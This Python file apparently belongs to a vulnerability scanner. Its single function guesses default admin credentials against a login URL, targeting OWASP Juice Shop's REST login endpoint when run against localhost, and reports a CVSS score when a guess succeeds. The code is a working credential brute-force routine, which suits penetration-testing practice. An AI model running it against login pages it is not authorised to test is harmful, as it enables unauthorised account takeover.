import requests

def brute_force_login(url, session=None):
    """
    Upgraded authentication brute-forcer that tests both standard forms 
    and modern JSON REST API endpoints.
    """
    if session is None:
        session = requests.Session()

    usernames = ["admin@juice-sh.op", "admin"]
    passwords = ["admin123", "password", "admin"]

    # Deduce if we need to hit Juice Shop's API directly
    target_endpoint = url
    if "localhost:3000" in url or "127.0.0.1:3000" in url:
        target_endpoint = "http://localhost:3000/rest/user/login"

    vulnerability_details = []

    for username in usernames:
        for password in passwords:
            # Modern API payload pattern
            json_payload = {"email": username, "password": password}
            # Classic form fallback
            form_payload = {"username": username, "password": password, "email": username}
            
            try:
                # 1. Try JSON REST API request format
                response = session.post(target_endpoint, json=json_payload, timeout=2)
                
                # Check for Juice Shop token success indicators
                if response.status_code == 200 and "authentication" in response.text.lower():
                    vulnerability_details.append(f"REST API Credential Compromise -> {username}:{password}")
                    return {"vulnerable": True, "severity": "Critical", "cvss": 9.8, "details": vulnerability_details}
                
                # 2. Try classic form format fallback
                response = session.post(url, data=form_payload, timeout=2)
                if response.status_code == 200 and "incorrect" not in response.text.lower() and "failed" not in response.text.lower():
                    vulnerability_details.append(f"Form Credential Compromise -> {username}:{password}")
                    return {"vulnerable": True, "severity": "High", "cvss": 7.5, "details": vulnerability_details}
                    
            except requests.exceptions.RequestException:
                continue

    return {
        "vulnerable": False,
        "severity": "Informational",
        "cvss": 0.0,
        "details": "No weak credential arrays matched modern API parameters."
    }